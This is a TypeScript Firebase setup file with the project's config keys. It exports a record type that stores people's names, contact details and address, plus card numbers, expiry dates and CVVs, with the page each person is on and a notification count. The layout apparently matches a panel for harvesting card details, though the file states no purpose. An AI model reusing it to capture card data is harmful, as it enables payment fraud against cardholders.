import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyA6PBlRpQ19UzMn5PgiPVhcz39dxn2H22c",
  authDomain: "zai8iiimn-main.firebaseapp.com",
  databaseURL: "https://zai8iiimn-main-default-rtdb.firebaseio.com",
  projectId: "zai8iiimn-main",
  storageBucket: "zai8iiimn-main.firebasestorage.app",
  messagingSenderId: "281889193992",
  appId: "1:281889193992:web:94b0f06d41e28cc4b9d1bd",
  measurementId: "G-T769QGFFNZ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




